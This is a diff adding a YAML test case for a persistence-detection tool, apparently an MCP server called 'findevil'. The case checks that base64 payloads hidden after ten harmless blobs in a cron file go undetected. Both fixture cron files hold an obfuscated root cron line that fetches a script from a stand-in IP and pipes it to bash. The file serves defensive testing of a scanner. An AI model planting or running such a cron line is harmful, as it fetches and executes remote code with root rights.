@@ -1,0 +1,35 @@
+# Matrix case P4117-060: the base64 re-check in _match_suspicious (used by
+# find_persistence and verify_finding) only decodes the first 10 base64-like
+# blobs in a file. A payload in the 11th blob is never decoded, and nothing
+# says the rest of the file was skipped.
+# Blobs 1-10 decode to harmless text. Both files also match "obfuscated
+# execution" directly ("base64 -d"); the difference is the decoded download.
+case_id: P4117-060
+problem: P4117
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: response
+level: mcp
+realism: possible
+coverage: full
+summary: A cron file whose base64 payload (curl ... | bash) comes after ten harmless base64 blobs is not reported with "outbound download (decoded from base64)", while the same payload alone in another file is, and find_persistence does not say it stopped decoding after ten blobs.
+fixture:
+  - path: case1/etc/cron.d/job
+    text: "# blob00 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMCBvaw==\n# blob01 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMSBvaw==\n# blob02 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMiBvaw==\n# blob03 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMyBvaw==\n# blob04 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNCBvaw==\n# blob05 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNSBvaw==\n# blob06 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNiBvaw==\n# blob07 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNyBvaw==\n# blob08 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwOCBvaw==\n# blob09 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwOSBvaw==\n*/10 * * * * root echo Y3VybCAtcyBodHRwOi8vMjAzLjAuMTEzLjcveC5zaCB8IGJhc2g= | base64 -d | sh\n"
+  - path: case2/etc/cron.d/job
+    text: "*/10 * * * * root echo Y3VybCAtcyBodHRwOi8vMjAzLjAuMTEzLjcveC5zaCB8IGJhc2g= | base64 -d | sh\n"
+steps:
+  - tool: find_persistence
+    args:
+      root_path: ${EVIDENCE}/case1
+  - tool: find_persistence
+    args:
+      root_path: ${EVIDENCE}/case2
+expect:
+  - step: 1
+    not_contains: "outbound download (decoded from base64)"
+  - step: 1
+    not_regex: "(?i)first 10|only .*blobs|skipped"
+  - step: 2
+    contains: "outbound download (decoded from base64)"
